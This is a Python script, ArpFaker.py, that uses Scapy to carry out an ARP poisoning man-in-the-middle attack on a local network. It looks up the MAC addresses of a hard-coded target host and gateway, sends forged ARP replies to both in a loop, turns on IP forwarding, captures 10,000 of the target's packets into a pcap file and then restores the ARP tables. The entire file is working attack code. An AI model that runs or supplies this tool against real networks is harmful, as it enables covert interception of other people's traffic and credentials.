#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @File  : ArpFaker.py
# @Author: wang xiao
# @Date  : 2022/11/5
# @Desc  : trace

from scapy.all import *
from scapy.layers.l2 import Ether, ARP
import signal
import threading
import os
import sys


# get mac address
def get_mac(ip_address):
    responses, unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=ip_address), timeout=2, retry=10)
    for s, r in responses:
        return r[Ether].src
    return None


def restore_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Restoring target......")
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5)

    # kill and return main line
    os.kill(os.getpid(), signal.SIGINT)


# begin to posion target
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    print("[*] Beginning the ARP poison. [CTRL-C to stop")

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] ARP poison attack finished")
    return


def main():
    interface = 'en0'
    target_ip = '192.168.3.179'
    gateway_ip = '192.168.3.1'
    packets_counts = 10000

    # configure interface id card
    conf.iface = interface

    # close output
    conf.verb = 0

    print("[*] Setting up %s" % interface)

    # get gateway mac address
    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!!!] Failed to get gateway MAC. Eixting.")
        sys.exit()
    else:
        print("[*] Gateway %s is at %s" % (gateway_ip, gateway_mac))

    # get Target mac address
    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!!!] Failed to get Target MAC. Eixting.")
        sys.exit()
    else:
        print("[*] Target %s is at %s" % (target_ip, target_mac))

    # set ip_forward
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

    # start multi-process ARP poison
    poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()

    try:
        print("[*] Starting sniffer for %d packets" % packets_counts)
        bpf_filter = "ip host %s" % target_ip
        packets = sniff(count=packets_counts, filter=bpf_filter, iface=interface)

        # catch packets
        wrpcap('arper.pcap', packets)

        # restore env
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

    except KeyboardInterrupt:
        # restore env
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)

        # set ip_forward
        os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')
        sys.exit(0)
    # set ip_forward
    os.system('echo 0 > /proc/sys/net/ipv4/ip_forward')


if __name__ == '__main__':
    main()
